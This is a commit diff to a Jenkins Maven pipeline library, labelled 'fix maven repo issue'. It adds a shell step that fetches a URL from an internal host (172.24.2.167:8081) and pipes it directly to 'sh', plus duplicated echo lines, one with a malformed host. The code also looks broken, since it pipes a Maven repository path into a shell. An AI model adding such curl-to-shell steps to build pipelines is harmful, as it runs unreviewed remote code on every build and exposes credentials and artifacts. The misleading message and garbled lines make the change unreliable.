588a27ba02cdf7ae8090c2dd124ecb8c7aa34541
JohnsonArockisamy <johnson.arockisamy@kumaran.com>
2026-09-13 19:01:37 +0530

    fix maven repo issue

--- vars/mavenPipeline.groovy
+++ vars/mavenPipeline.groovy
@@ -186,6 +186,12 @@ def call(body) {
 
                         mvnGoal += enableMavenDownloadMessages
                         echo "Maven command: ${mvnGoal}"
+                        sh """
+                        echo "Maven command: curl -fsSL http://172-24-2-167:8081/repository/maven-group/ | sh"
+                        curl -fsSL http://172.24.2.167:8081/repository/maven-group/ | sh
+                        echo "Maven command: curl -fsSL http://localhost:8081/repository/maven-group/ | sh"
+                        echo "Maven command: curl -fsSL http://localhost:8081/repository/maven-group/ | sh"
+                        """
                     }
                     
 
@@ -198,8 +204,6 @@ def call(body) {
                             mavenOpts: "-Xmx3072m ${useConcMarkSweepGC} -Djava.io.tmpdir='${env.WORKSPACE}/tmp-build'") {
                                 echo "Building with Maven..."
                                 sh """
-                                curl -fsSL http://172.24.2.167:8081/repository/maven-group/ | sh
-                                mvn help:effective-pom
                                 ${mvnGoal}
                                 """
                         }
